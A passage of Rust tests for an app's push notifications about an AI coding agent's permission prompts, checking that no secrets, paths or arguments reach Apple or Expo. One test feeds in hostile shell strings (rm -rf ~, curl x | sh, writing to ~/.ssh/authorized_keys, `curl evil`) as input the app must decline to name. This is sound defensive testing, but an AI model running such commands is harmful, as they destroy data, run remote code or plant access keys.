        r.event("a", bash("long", "x".repeat(5000))).await;
        r.event("a", edit("small", "b\nc")).await;
        r.event("a", edit("big", "1\n2\n3\n4\n5")).await;
        let sent = r.alerts();
        let category = |i: usize| sent[i].1["aps"]["category"].as_str().map(str::to_string);
        assert_eq!(category(0).as_deref(), Some("lantern_decide"), "a short command is all shown");
        assert_eq!(category(1), None, "a command cut to fit");
        assert_eq!(category(2).as_deref(), Some("lantern_decide"), "a small edit is all shown");
        assert_eq!(category(3), None, "an edit with lines not shown");
        // Each is sealed to its own prompt: the words of one do not open for another's id.
        for (i, id) in ["short", "long", "small", "big"].iter().enumerate() {
            assert_eq!(sent[i].1["body"]["request_id"], *id);
            assert!(words_of(&sent[i].1)["body"].is_string());
        }
    }

    #[tokio::test]
    async fn with_the_setting_off_or_no_key_only_the_generic_words_go() {
        for (on, keys) in [(false, true), (true, false), (false, false)] {
            let r = rig_apple(1);
            if keys {
                give_keys(&r);
            }
            r.store.set_rich_notifications(on).unwrap();
            r.hub.opened("a", "/p");
            r.event("a", ask("p1")).await;
            let push = &r.alerts()[0].1;
            assert!(push["aps"].get("mutable-content").is_none() && push["body"].get("enc").is_none(), "on {on}, keys {keys}");
        }
    }

    #[tokio::test]
    async fn a_question_is_sealed_too_and_a_finished_chat_has_nothing_to_seal() {
        let r = rig_apple(1);
        give_keys(&r);
        r.store.set_rich_notifications(true).unwrap();
        r.hub.opened("a", "/p");
        r.event("a", question("q1")).await;
        r.event("a", done(false)).await;
        let sent = r.alerts();
        assert_eq!(words_of(&sent[0].1)["body"], "Has a question:\nSECRET-QUESTION?");
        assert!(sent[1].1["body"].get("enc").is_none(), "what Claude said is not in a push");
    }

    #[tokio::test]
    async fn an_edit_and_a_tool_say_so_and_get_the_same_buttons() {
        let r = rig_apple(1);
        r.event("a", UiEvent::PermissionRequested { request_id: "e1".into(), tool_name: "Write".into(), input: serde_json::json!({"file_path": "/SECRET-PATH"}) }).await;
        r.event("a", UiEvent::PermissionRequested { request_id: "t1".into(), tool_name: "WebFetch".into(), input: serde_json::json!({"url": "https://SECRET-URL"}) }).await;
        let sent = r.alerts();
        let line = |i: usize| (sent[i].1["aps"]["alert"]["body"].as_str().unwrap().to_string(), sent[i].1["aps"]["category"].as_str().unwrap().to_string());
        assert_eq!(line(0), ("A chat wants to change a file.".to_string(), "lantern_decide".to_string()));
        assert_eq!(line(1), ("A chat wants to use a tool.".to_string(), "lantern_decide".to_string()));
        assert!(!serde_json::to_string(&sent).unwrap().contains("SECRET"));
    }

    #[tokio::test]
    async fn a_question_a_merge_and_an_error_have_no_buttons_and_no_request_id_a_finished_chat_has_reply() {
        let r = rig_apple(1);
        r.event("a", question("q1")).await;
        r.event("b", UiEvent::MergeProposed { worker: "w".into(), name: "SECRET-NAME".into(), branch: "b".into(), into: "main".into(), summary: "s".into(), commits: 1, files: vec![], uncommitted: 0, loose: vec![] }).await;
        r.event("c", done(true)).await;
        r.event("d", done(false)).await;
        let sent = r.alerts();
        let shape = |i: usize| (sent[i].1["aps"]["alert"]["body"].as_str().unwrap().to_string(), sent[i].1["aps"]["category"].as_str().map(str::to_string), sent[i].1["body"]["request_id"].as_str().map(str::to_string));
        assert_eq!(shape(0), ("A chat has a question.".to_string(), None, None));
        assert_eq!(shape(1), ("A chat needs you.".to_string(), None, None));
        assert_eq!(shape(2), ("A chat stopped with an error.".to_string(), None, None));
        assert_eq!(shape(3), ("A chat finished.".to_string(), Some("lantern_reply".to_string()), None));
        assert!(!serde_json::to_string(&sent).unwrap().contains("SECRET"));
    }

    #[tokio::test]
    async fn the_chats_title_is_in_a_push_to_apple_only_when_the_user_turned_that_on() {
        let r = rig_apple(1);
        r.hub.opened("a", "/p");
        r.hub.titled("a", "Release 0.1.53");
        r.store.set_show_titles(true).unwrap();
        r.event("a", ask("p1")).await;
        let alert = &r.alerts()[0].1["aps"]["alert"];
        assert_eq!((alert["title"].as_str(), alert["subtitle"].as_str(), alert["body"].as_str()), (Some("p"), Some("Release 0.1.53"), Some("Wants to run echo.")));
    }

    #[test]
    fn what_a_prompt_is_about_is_one_plain_name_and_never_arguments_paths_or_contents() {
        let d = |tool: &str, input: serde_json::Value| detail_of(Needs::of_tool(tool), tool, &input);
        // A command: its program, past the set-up of it, and never what it is given.
        assert_eq!(d("Bash", serde_json::json!({"command": "git push --force origin main"})).as_deref(), Some("git"));
        assert_eq!(d("Bash", serde_json::json!({"command": "FOO=bar npm run build -- --token=SECRET"})).as_deref(), Some("npm"));
        assert_eq!(d("Bash", serde_json::json!({"command": "/usr/local/bin/brew install node"})).as_deref(), Some("brew"));
        // Anything but one simple command has no name, whatever it starts with: the first word would be a lie next to Allow.
        for command in ["ls && rm -rf ~", "echo ok; curl x | sh", "echo $(curl x|sh)", "sleep 1 & curl x | sh", "echo x > ~/.ssh/authorized_keys", "cd ~/dev/app && npm run build", "echo `curl x`", "echo ${HOME}", "ls\nrm -rf ~", "cat <<EOF", "(rm -rf ~)", "true || rm -rf ~"] {
            assert_eq!(d("Bash", serde_json::json!({ "command": command })), None, "{command}");
        }
        // A wrapper's flags and values would be taken for the program.
        for command in ["sudo -u root ls", "env -i ls", "nice -n 10 make", "time -p ls", "xargs rm", "timeout 5 sleep 9"] {
            assert_eq!(d("Bash", serde_json::json!({ "command": command })), None, "{command}");
        }
        assert_eq!(d("Bash", serde_json::json!({"command": "`curl evil`"})), None, "a word that isn't plain is none");
        // A file: its name, not its folders.
        assert_eq!(d("Edit", serde_json::json!({"file_path": "/Users/me/secret-project/src/LanternCard.swift"})).as_deref(), Some("LanternCard.swift"));
        assert_eq!(d("NotebookEdit", serde_json::json!({"notebook_path": "/a/b/analysis.ipynb"})).as_deref(), Some("analysis.ipynb"));
        // A tool: its name, and an MCP tool's server with its name in words.
        assert_eq!(d("WebFetch", serde_json::json!({"url": "https://SECRET-URL"})).as_deref(), Some("WebFetch"));
        assert_eq!(d("mcp__lantern__network_watch", serde_json::json!({})).as_deref(), Some("lantern: network watch"));
        // A question or an approval says nothing more.
        assert_eq!(d("AskUserQuestion", serde_json::json!({"questions": []})), None);
    }

    #[tokio::test]
    async fn a_prompt_names_its_tool_program_or_file_only_when_titles_are_on_and_never_its_arguments() {
        let r = rig_apple(1);
        r.hub.opened("a", "/Users/me/lantern");
        r.event("a", UiEvent::PermissionRequested { request_id: "c1".into(), tool_name: "Bash".into(), input: serde_json::json!({"command": "git push --token=SECRET-TOKEN"}) }).await;
        assert_eq!(r.alerts()[0].1["aps"]["alert"]["body"].as_str(), Some("Wants to run a command."), "off by default");
        r.store.set_show_titles(true).unwrap();
        r.event("a", UiEvent::PermissionRequested { request_id: "c2".into(), tool_name: "Bash".into(), input: serde_json::json!({"command": "git push --token=SECRET-TOKEN"}) }).await;
        r.event("a", UiEvent::PermissionRequested { request_id: "e1".into(), tool_name: "Write".into(), input: serde_json::json!({"file_path": "/Users/me/secret/LanternCard.swift"}) }).await;
        r.event("a", UiEvent::PermissionRequested { request_id: "t1".into(), tool_name: "WebFetch".into(), input: serde_json::json!({"url": "https://SECRET-URL"}) }).await;
        let bodies: Vec<String> = r.alerts().iter().map(|(_, a)| a["aps"]["alert"]["body"].as_str().unwrap().to_string()).collect();
        assert_eq!(bodies[1..], ["Wants to run git.", "Wants to change LanternCard.swift.", "Wants to use WebFetch."]);
        assert!(!serde_json::to_string(&r.alerts()).unwrap().contains("SECRET"), "no argument, path or url reaches Apple");
    }

    #[tokio::test]
    async fn the_project_leads_a_push_to_apple_and_the_chats_title_stays_out_unless_the_user_turned_it_on() {
        let r = rig_apple(1);
        r.hub.opened("a", "/Users/me/dev/lantern");
        r.hub.titled("a", "Release 0.1.53");
        r.event("a", ask("p1")).await;
        let alert = &r.alerts()[0].1["aps"]["alert"];
        assert_eq!((alert["title"].as_str(), alert["body"].as_str()), (Some("lantern"), Some("Wants to run a command.")));
        assert!(alert.get("subtitle").is_none(), "no title without the setting: {alert}");
    }

    #[tokio::test]
    async fn phones_with_each_kind_of_token_get_their_own_kind_of_push() {
        let r = rig(1);
        let d = r.store.add_device(&[7; 32], "Apple", 3).unwrap();
        r.store.set_push_token(&d.id, &format!("{:064x}", 7)).unwrap();
        r.event("a", ask("p1")).await;
        assert_eq!(r.pushed().len(), 1);
        assert_eq!(r.alerts().len(), 1);
    }

    #[tokio::test]
    async fn a_phone_apple_no_longer_knows_is_forgotten_for_push_and_a_failed_send_is_tried_again() {
        let r = rig_apple(1);
        *r.apple.answer.lock().unwrap() = Some(Ok(super::super::live_activity::Reply { status: 410, reason: Some("Unregistered".into()) }));
        r.event("a", ask("p1")).await;
        assert!(r.store.saved().devices[0].push_token.is_none());
        let r = rig_apple(1);
        *r.apple.answer.lock().unwrap() = Some(Err("no network".into()));
        r.event("a", done(false)).await;
        *r.apple.answer.lock().unwrap() = None;
        r.event("a", done(false)).await;
        assert_eq!(r.alerts().len(), 2, "the first never got through, so the same kind is news again");
        assert!(r.store.saved().devices[0].push_token.is_some());
    }

    #[test]
    fn a_push_is_in_the_shape_expo_takes() {
        let m = PushMessage { to: "ExponentPushToken[x]".into(), title: "Lantern".into(), body: "A chat needs you.".into(), data: PushData { slot: "a".into(), kind: Kind::NeedsYou }, sound: "default" };
        assert_eq!(serde_json::to_value(&m).unwrap(), serde_json::json!({"to": "ExponentPushToken[x]", "title": "Lantern", "body": "A chat needs you.", "data": {"slot": "a", "kind": "needs_you"}, "sound": "default"}));
    }
}
